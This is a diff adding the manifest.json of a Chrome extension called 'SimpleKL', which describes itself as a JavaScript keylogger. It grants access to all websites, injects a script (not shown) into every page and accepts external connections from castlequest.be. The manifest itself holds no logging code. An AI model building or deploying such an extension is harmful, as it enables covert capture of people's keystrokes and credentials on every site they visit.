@@ -1,0 +1,21 @@
+{
+	"manifest_version": 2,
+	"name": "SimpleKL",
+	"description": "Simple JS based keylogger extension.",
+	"version": "1.0",
+
+	"permissions": [
+		"http://*/*",
+		"https://*/*"
+	],
+	"background": {
+    	"scripts": ["myscript.js"]
+  	},
+  	"content_scripts": [{
+	    "matches": ["*://*/*"],
+	    "js": ["myscript.js"]
+  	}],
+  	"externally_connectable": {
+  		"matches": ["*://*.castlequest.be/*"]
+	}
+}
